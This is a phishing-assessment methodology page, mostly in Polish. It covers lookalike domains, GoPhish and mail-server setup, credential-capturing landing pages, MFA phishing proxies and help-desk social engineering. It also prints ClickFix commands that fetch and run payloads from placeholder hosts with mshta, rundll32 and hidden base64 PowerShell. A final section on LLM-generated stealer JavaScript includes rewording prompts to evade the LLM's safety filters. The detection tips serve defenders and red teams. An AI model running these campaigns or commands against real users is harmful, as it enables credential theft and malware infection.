# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon ofiarę
1. Wybierz **domenę ofiary**.
2. Wykonaj podstawowe web enumeration **szukając portali logowania** używanych przez ofiarę i **zdecyduj**, który z nich będziesz **impersonate**.
3. Użyj **OSINT** do **znalezienia emaili**.
2. Przygotuj środowisko
1. **Kup domenę**, której użyjesz do phishing assessment
2. **Skonfiguruj rekordy** związane z usługą email (SPF, DMARC, DKIM, rDNS)
3. Skonfiguruj VPS z **gophish**
3. Przygotuj campaign
1. Przygotuj **email template**
2. Przygotuj **web page** do kradzieży credentials
4. Uruchom campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Nazwa domeny **zawiera** ważne **keyword** oryginalnej domeny (np. zelster.com-management.com).
- **hypened subdomain**: Zmień **kropkę na myślnik** w subdomain (np. www-zelster.com).
- **New TLD**: Ta sama domena używająca **new TLD** (np. zelster.org)
- **Homoglyph**: **Zastępuje** literę w nazwie domeny **literami wyglądającymi podobnie** (np. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Zamienia miejscami dwie litery** w nazwie domeny (np. zelsetr.com).
- **Singularization/Pluralization**: Dodaje lub usuwa „s” na końcu nazwy domeny (np. zeltsers.com).
- **Omission**: **Usuwa jedną** z liter z nazwy domeny (np. zelser.com).
- **Repetition:** **Powtarza jedną** z liter w nazwie domeny (np. zeltsser.com).
- **Replacement**: Jak homoglyph, ale mniej stealthy. Zastępuje jedną z liter w nazwie domeny, być może literą znajdującą się blisko oryginalnej litery na klawiaturze (np, zektser.com).
- **Subdomained**: Wprowadź **kropkę** wewnątrz nazwy domeny (np. ze.lster.com).
- **Insertion**: **Wstawia literę** do nazwy domeny (np. zerltser.com).
- **Missing dot**: Dodaj TLD do nazwy domeny. (np. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że jeden z bitów przechowywanych lub przesyłanych może zostać automatycznie odwrócony** z powodu różnych czynników, takich jak solar flares, cosmic rays lub hardware errors.

Gdy ta koncepcja jest **zastosowana do DNS requests**, możliwe jest, że **domena odebrana przez DNS server** nie jest taka sama jak domena pierwotnie zażądana.

Na przykład pojedyncza modyfikacja bitu w domenie "windows.com" może zmienić ją na "windnws.com."

Atakujący mogą **wykorzystać to, rejestrując wiele bit-flipping domains**, które są podobne do domeny ofiary. Ich celem jest przekierowanie legalnych użytkowników do własnej infrastruktury.

Więcej informacji: [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Możesz szukać w [https://www.expireddomains.net/](https://www.expireddomains.net) wygasłej domeny, której mógłbyś użyć.\
Aby upewnić się, że wygasła domena, którą zamierzasz kupić **ma już dobre SEO**, możesz sprawdzić, jak jest kategoryzowana w:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **odkryć więcej** poprawnych adresów email lub **zweryfikować te**, które już odkryłeś, możesz sprawdzić, czy da się je brute-force'ować na smtp servers ofiary. [Dowiedz się, jak zweryfikować/odkryć adres email tutaj](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto nie zapomnij, że jeśli użytkownicy używają **jakiegokolwiek web portal do dostępu do swoich maili**, możesz sprawdzić, czy jest podatny na **username brute force**, i wykorzystać podatność, jeśli to możliwe.

## Configuring GoPhish

### Installation

Możesz pobrać go z [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz i rozpakuj go w `/opt/gophish` i uruchom `/opt/gophish/gophish`\
W output otrzymasz hasło dla admin user na porcie 3333. Następnie uzyskaj dostęp do tego portu i użyj tych credentials, aby zmienić hasło admina. Możesz potrzebować tunelowania tego portu do local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed tym krokiem powinieneś już **kupić domenę**, której zamierzasz użyć, i musi ona być **wskazywać** na **IP VPS-a**, na którym konfigurujesz **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracja Mail**

Zacznij od instalacji: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień również wartości następujących zmiennych wewnątrz /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na końcu zmodyfikuj pliki **`/etc/hostname`** i **`/etc/mailname`** na nazwę swojej domeny oraz **zrestartuj swój VPS.**

Teraz utwórz rekord **DNS A** dla `mail.<domain>` wskazujący na **adres IP** VPS-a oraz rekord **DNS MX** wskazujący na `mail.<domain>`

Teraz przetestujmy wysyłanie emaila:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Konfiguracja Gophish**

Zatrzymaj działanie gophish i skonfigurujmy je.\
Zmodyfikuj `/opt/gophish/config.json` na następujące ustawienia (zwróć uwagę na użycie https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Skonfiguruj usługę gophish**

Aby utworzyć usługę gophish, aby mogła być uruchamiana automatycznie i zarządzana jako usługa, możesz utworzyć plik `/etc/init.d/gophish` z następującą zawartością:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Dokończ konfigurację usługi i sprawdź ją, wykonując:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurowanie serwera pocztowego i domeny

### Poczekaj i bądź legit

Im starsza domena, tym mniejsze prawdopodobieństwo, że zostanie uznana za spam. Powinieneś więc poczekać jak najdłużej, jak to możliwe (co najmniej 1week), przed phishing assessment. Ponadto, jeśli umieścisz stronę dotyczącą sektora reputational, uzyskana reputacja będzie lepsza.

Zwróć uwagę, że nawet jeśli musisz poczekać tydzień, możesz już teraz dokończyć konfigurację wszystkiego.

### Skonfiguruj rekord Reverse DNS (rDNS)

Ustaw rekord rDNS (PTR), który rozwiązuje adres IP VPS na nazwę domeny.

### Sender Policy Framework (SPF) Record

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz użyć [https://www.spfwizard.net/](https://www.spfwizard.net) do wygenerowania swojej polityki SPF (użyj IP maszyny VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

To jest zawartość, która musi zostać ustawiona wewnątrz rekordu TXT w domenie:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Musisz utworzyć nowy rekord DNS TXT wskazujący hostname `_dmarc.<domain>` z następującą zawartością:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ten tutorial opiera się na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Musisz połączyć oba wartości B64, które generuje klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Przetestuj ocenę konfiguracji poczty

Możesz to zrobić, używając [https://www.mail-tester.com/](https://www.mail-tester.com)\
Wystarczy wejść na stronę i wysłać email na podany przez nich adres:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Możesz także **sprawdzić swoją konfigurację email** wysyłając email do `check-auth@verifier.port25.com` i **czytając odpowiedź** (w tym celu będziesz musiał **otworzyć** port **25** i zobaczyć odpowiedź w pliku _/var/mail/root_ jeśli wyślesz email jako root).\
Sprawdź, czy przechodzisz wszystkie testy:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Możesz też wysłać **wiadomość na Gmail kontrolowany przez siebie**, a następnie sprawdzić **nagłówki emaila** w swojej skrzynce Gmail; w polu nagłówka `Authentication-Results` powinno być obecne `dkim=pass`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Twoja domena jest blokowana przez spamhouse. Możesz poprosić o usunięcie swojej domeny/IP tutaj: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Możesz poprosić o usunięcie swojej domeny/IP tutaj: [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Ustaw **nazwę identyfikującą** profil nadawcy
- Zdecyduj, z którego konta będziesz wysyłać phishing emails. Suggestions: _noreply, support, servicedesk, salesforce..._
- Możesz zostawić puste username i password, ale upewnij się, że zaznaczono Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Zaleca się użycie funkcji "**Send Test Email**", aby sprawdzić, czy wszystko działa.\
> Polecałbym **wysyłać testowe emails na 10min mails addresses**, aby uniknąć dodania do blacklist podczas testów.

### Email Template

- Ustaw **nazwę identyfikującą** template
- Następnie wpisz **subject** (nic dziwnego, po prostu coś, czego można oczekiwać w zwykłym email)
- Upewnij się, że zaznaczono "**Add Tracking Image**"
- Napisz **email template** (możesz używać variables jak w poniższym przykładzie):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note, że **aby zwiększyć wiarygodność emaila**, zaleca się użycie jakiejś sygnatury z emaila klienta. Sugestie:

- Wyślij email na **nieistniejący adres** i sprawdź, czy odpowiedź zawiera jakąś sygnaturę.
- Poszukaj **publicznych emaili** typu info@ex.com, press@ex.com lub public@ex.com, wyślij na nie email i poczekaj na odpowiedź.
- Spróbuj skontaktować się z **jakimś poprawnie wykrytym** emailem i poczekaj na odpowiedź

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template pozwala także **dołączać pliki do wysłania**. Jeśli chcesz również kraść wyzwania NTLM przy użyciu specjalnie spreparowanych plików/dokumentów, [przeczytaj tę stronę](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Wpisz **nazwę**
- **Wpisz kod HTML** strony WWW. Zwróć uwagę, że możesz **importować** strony WWW.
- Zaznacz **Capture Submitted Data** i **Capture Passwords**
- Ustaw **przekierowanie**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Zazwyczaj trzeba będzie zmodyfikować kod HTML strony i zrobić kilka testów lokalnie (może przy użyciu jakiegoś serwera Apache) **aż uzyskasz satysfakcjonujące rezultaty.** Następnie wpisz ten kod HTML w polu.\
> Zwróć uwagę, że jeśli musisz **użyć statycznych zasobów** dla HTML (może jakichś stron CSS i JS), możesz zapisać je w _**/opt/gophish/static/endpoint**_ i potem uzyskiwać do nich dostęp przez _**/static/\<filename>**_

> [!TIP]
> W przypadku przekierowania możesz **przekierować użytkowników na legalną główną stronę WWW** ofiary albo przekierować ich na przykład do _/static/migration.html_, umieszczając tam jakiś **kręcący się wskaźnik (**[**https://loading.io/**](https://loading.io)**) na 5 sekund, a potem wskazując, że proces zakończył się sukcesem**.

### Users & Groups

- Ustaw nazwę
- **Zaimportuj dane** (zwróć uwagę, że aby użyć szablonu z przykładu, potrzebujesz imienia, nazwiska i adresu email każdego użytkownika)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Na koniec utwórz kampanię, wybierając nazwę, szablon emaila, landing page, URL, sending profile i grupę. Zwróć uwagę, że URL będzie linkiem wysłanym do ofiar

Zwróć uwagę, że **Sending Profile pozwala wysłać testowy email, aby zobaczyć, jak będzie wyglądał końcowy phishingowy email**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Polecam **wysyłać testowe emaile na adresy 10min mail**, aby uniknąć trafienia na czarne listy podczas testów.

Gdy wszystko będzie gotowe, po prostu uruchom kampanię!

## Website Cloning

Jeśli z jakiegokolwiek powodu chcesz sklonować stronę WWW, sprawdź następującą stronę:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

W niektórych ocenach phishingowych (głównie dla Red Teams) będziesz chciał także **wysyłać pliki zawierające jakiś backdoor** (może C2 albo po prostu coś, co wyzwoli uwierzytelnienie).\
Sprawdź następującą stronę po kilka przykładów:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Poprzedni atak jest dość sprytny, ponieważ podszywasz się pod prawdziwą stronę WWW i zbierasz informacje wpisywane przez użytkownika. Niestety, jeśli użytkownik nie podał poprawnego hasła albo jeśli aplikacja, którą podszywasz się, jest skonfigurowana z 2FA, **te informacje nie pozwolą ci podszyć się pod oszukanego użytkownika**.

W tym miejscu przydają się narzędzia takie jak [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). To narzędzie pozwoli ci wygenerować atak podobny do MitM. Zasadniczo atak działa w następujący sposób:

1. **Podszywasz się pod formularz logowania** prawdziwej strony WWW.
2. Użytkownik **wysyła** swoje **dane uwierzytelniające** na twoją fałszywą stronę, a narzędzie przesyła je do prawdziwej strony WWW, **sprawdzając, czy dane działają**.
3. Jeśli konto jest skonfigurowane z **2FA**, strona MitM poprosi o nie, a gdy **użytkownik je wprowadzi**, narzędzie wyśle je do prawdziwej strony WWW.
4. Gdy użytkownik zostanie uwierzytelniony, ty (jako atakujący) będziesz mieć **przechwycone dane uwierzytelniające, 2FA, cookie oraz wszelkie informacje** z każdej interakcji, podczas gdy narzędzie wykonuje MitM.

### Via VNC

A co jeśli zamiast **wysyłać ofiarę na złośliwą stronę** o takim samym wyglądzie jak oryginalna, wyślesz ją do **sesji VNC z przeglądarką połączoną z prawdziwą stroną WWW**? Będziesz mógł zobaczyć, co robi, ukraść hasło, użyte MFA, cookie...\
Możesz to zrobić za pomocą [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Oczywiście jednym z najlepszych sposobów, aby dowiedzieć się, czy zostałeś wykryty, jest **sprawdzenie swojej domeny na czarnych listach**. Jeśli się tam pojawi, twoja domena została w jakiś sposób uznana za podejrzaną.\
Jednym z prostych sposobów sprawdzenia, czy twoja domena pojawia się na jakiejkolwiek czarnej liście, jest użycie [https://malwareworld.com/](https://malwareworld.com)

Istnieją jednak inne sposoby, aby dowiedzieć się, czy ofiara **aktywnie szuka podejrzanej aktywności phishingowej w naturze**, jak opisano w:


{{#ref}}
detecting-phising.md
{{#endref}}

Możesz **kupić domenę o bardzo podobnej nazwie** do domeny ofiary **i/lub wygenerować certyfikat** dla **subdomeny** domeny kontrolowanej przez ciebie, **zawierającej** **keyword** domeny ofiary. Jeśli **ofiara** wykona jakąkolwiek interakcję **DNS lub HTTP** z nimi, będziesz wiedział, że **aktywnie szuka** podejrzanych domen i będziesz musiał być bardzo stealth.

### Evaluate the phishing

Użyj [**Phishious** ](https://github.com/Rices/Phishious), aby ocenić, czy twój email trafi do folderu spam, czy zostanie zablokowany, czy też odniesie sukces.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Nowoczesne zestawy intrusion coraz częściej całkowicie pomijają email lures i **bezpośrednio atakują workflow service-desk / identity-recovery**, aby obejść MFA. Atak jest całkowicie "living-off-the-land": gdy operator ma prawidłowe dane uwierzytelniające, przechodzi dalej przy użyciu wbudowanych narzędzi administracyjnych – malware nie jest wymagany.

### Attack flow
1. Recon ofiary
* Zbierz dane osobowe i firmowe z LinkedIn, wycieków danych, publicznego GitHub itp.
* Zidentyfikuj konta o wysokiej wartości (kierownictwo, IT, finanse) i ustal **dokładny proces help-desk** resetowania hasła / MFA.
2. Social engineering w czasie rzeczywistym
* Zadzwoń, napisz na Teams lub czacie do help-desk, podszywając się pod cel (często z **spoofowanym caller-ID** lub **sklonowanym głosem**).
* Podaj wcześniej zebrane PII, aby przejść weryfikację opartą na wiedzy.
* Przekonaj agenta, aby **zresetował sekret MFA** albo wykonał **SIM-swap** na zarejestrowanym numerze telefonu.
3. Natychmiastowe działania po uzyskaniu dostępu (≤60 min w realnych przypadkach)
* Ustanów foothold przez dowolny portal webowy SSO.
* Zrób enumerację AD / AzureAD za pomocą wbudowanych narzędzi (bez zrzucania binarek):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement za pomocą **WMI**, **PsExec** albo legalnych agentów **RMM** już dopuszczonych w środowisku.

### Detection & Mitigation
* Traktuj odzyskiwanie tożsamości przez help-desk jako **operację uprzywilejowaną** – wymagaj dodatkowego uwierzytelnienia i akceptacji przełożonego.
* Wdróż reguły **Identity Threat Detection & Response (ITDR)** / **UEBA**, które alarmują o:
* Zmianie metody MFA + uwierzytelnieniu z nowego urządzenia / geolokalizacji.
* Natychmiastowym podniesieniu uprawnień tego samego principala (user-→-admin).
* Rejestruj rozmowy z help-desk i wymuszaj **oddzwonienie na już zarejestrowany numer** przed jakimkolwiek resetem.
* Wdroż **Just-In-Time (JIT) / Privileged Access**, aby świeżo zresetowane konta **nie** dziedziczyły automatycznie tokenów o wysokich uprawnieniach.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Grupy commodity rekompensują koszt operacji high-touch masowymi atakami, które zamieniają **wyszukiwarki i sieci reklamowe w kanał dostarczania**.

1. **SEO poisoning / malvertising** wypycha fałszywy wynik, taki jak `chromium-update[.]site`, na szczyt reklam w wyszukiwarce.
2. Ofiara pobiera mały **first-stage loader** (często JS/HTA/ISO). Przykłady widziane przez Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltruje cookie przeglądarki + bazy danych poświadczeń, a następnie pobiera **silent loader**, który decyduje – *in realtime* – czy wdrożyć:
* RAT (np. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (klucz Run w rejestrze + scheduled task)

### Hardening tips
* Blokuj nowo zarejestrowane domeny i wymuszaj **Advanced DNS / URL Filtering** zarówno dla *search-ads*, jak i emaili.
* Ogranicz instalację oprogramowania do podpisanych pakietów MSI / Store, blokuj wykonanie `HTA`, `ISO`, `VBS` przez politykę.
* Monitoruj procesy potomne przeglądarek otwierające instalatory:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Poluj na LOLBins często nadużywane przez first-stage loaders (np. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Niektóre fałszywe portale oprogramowania utrzymują widoczny `href` pobierania wskazujący na **prawdziwy** adres URL GitHub/release, ale przechwytują **pierwszą** interakcję użytkownika w JavaScript i zamiast tego kierują ofiarę do łańcucha **Traffic Distribution System (TDS)**.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Key traits:
- Hook zwykle działa w fazie **capture** (`true`) na `document`, więc uruchamia się przed handlerami strony.
- Chrome często używa `mousedown` zamiast `click`, aby utrzymać przekierowanie związane z poprawnym **user gesture** i poprawić obejście popup-blockera.
- Niektóre warianty najpierw otwierają `about:blank` albo syntetyzują kliknięcia `<a target="_blank">`, a dopiero później ustawiają URL TDS.
- Limity po stronie przeglądarki zwykle są przechowywane w `localStorage`, więc **pierwszy click** może trafić do malware, a odświeżenia/próby ponowne mogą wracać do wyglądającego na benigny widocznego linku.
- TDS może gate'ować według referrer, domeny wejścia, GEO, browser/device fingerprint, VPN/datacenter checks, click context i liczników per-session, przez co powtórki analityka są niedeterministyczne.

Defender ideas:
- Porównuj **wyświetlany** `href` z **rzeczywistym** celem nawigacji generowanym w momencie click.
- Szukaj handlerów `document.addEventListener(..., true)` wywołujących zarówno `preventDefault()`, jak i `stopImmediatePropagation()` wokół `window.open`, `about:blank` albo syntetycznych kliknięć anchor.
- Traktuj klastry nowo zarejestrowanych domen do pobierania software, które wszystkie ładują ten sam etap CloudFront/JS, jako sygnał wysokiej pewności dla SEO-poisoning/TDS pattern.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Some TDS branches end in a fake verification page (Cloudflare/IUAM style) that tells the victim to run a trusted Windows binary such as:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Uwagi:
- `mshta.exe` wykonuje **HTA/VBScript na początku odpowiedzi**, nawet jeśli URL udaje archiwum `.7z`; dołączone dane archiwum mogą być czystą przynętą.
- Kolejne etapy często dalej kłamią co do typu pliku (`.rtf` dla PowerShell, `.asar` dla Python, ZIP-y z dopełnionymi binariami), a następnie przechodzą na **manual PE mapping / in-memory execution**.
- Jeśli odpowiadasz na jeden z tych łańcuchów, zachowaj **network + memory z pierwszego udanego uruchomienia**: późniejsze powtórzenia mogą pokazywać tylko benign installer/SFX path albo nie powieść się, bo payload/udostępnienie klucza było powiązane z oryginalną sesją TDS.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Przynęta: sklonowany krajowy CERT advisory z przyciskiem **Update**, który wyświetla krok po kroku instrukcje „fix”. Ofiary są instruowane, aby uruchomić batch, który pobiera DLL i wykonuje ją przez `rundll32`.
* Typowy zaobserwowany łańcuch batch:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` zapisuje payload do `%TEMP%`, krótka pauza ukrywa network jitter, a potem `rundll32` wywołuje eksportowany entrypoint (`notepad`).
* DLL beaconuje tożsamość hosta i odpytuje C2 co kilka minut. Zdalne tasking przychodzi jako **base64-encoded PowerShell** wykonywany ukrycie i z obejściem polityki:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* To zachowuje elastyczność C2 (serwer może podmieniać zadania bez aktualizowania DLL) i ukrywa okna konsoli. Szukaj dzieci PowerShell procesu `rundll32.exe` z `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` razem.
* Obrońcy mogą szukać wywołań HTTP(S) w formie `...page.php?tynor=<COMPUTER>sss<USER>` oraz 5-minutowych interwałów polling po załadowaniu DLL.

---

## AI-Enhanced Phishing Operations
Atakujący teraz łączą **LLM & voice-clone APIs** dla w pełni spersonalizowanych przynęt i interakcji w czasie rzeczywistym.

| Warstwa | Przykład użycia przez threat actor |
|-------|-------------|
|Automation|Generuj i wysyłaj >100 k e-maili / SMS z losowym wordingiem i tracking links.|
|Generative AI|Twórz *jednorazowe* e-maile odnoszące się do publicznego M&A, wewnętrznych żartów z social media; deep-fake głosu CEO w callback scam.|
|Agentic AI|Autonomicznie rejestruj domeny, scrapuj open-source intel, twórz kolejne maile, gdy ofiara kliknie, ale nie poda creds.|

**Defence:**
• Dodawaj **dynamic banners** podkreślające wiadomości wysłane z nieufnej automatyzacji (przez anomalie ARC/DKIM).
• Wdrażaj **voice-biometric challenge phrases** dla wysokiego ryzyka próśb telefonicznych.
• Ciągle symuluj AI-generated lures w programach awareness – statyczne szablony są przestarzałe.

Zobacz też – nadużycie agentic browsing do credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Zobacz też – nadużycie AI agent do lokalnych narzędzi CLI i MCP (dla secrets inventory i detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Atakujący mogą dostarczyć HTML wyglądający na benign i **wygenerować stealer w runtime**, prosząc **trusted LLM API** o JavaScript, a następnie wykonując go w przeglądarce (np. `eval` lub dynamiczny `<script>`).

1. **Prompt-as-obfuscation:** koduj exfil URLs/Base64 strings w prompt; iteruj wording, aby obejść safety filters i zmniejszyć hallucinations.
2. **Client-side API call:** przy ładowaniu JS wywołuje publiczny LLM (Gemini/DeepSeek/etc.) albo proxy CDN; w statycznym HTML obecny jest tylko prompt/API call.
3. **Assemble & exec:** konkatenuj odpowiedź i wykonaj ją (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
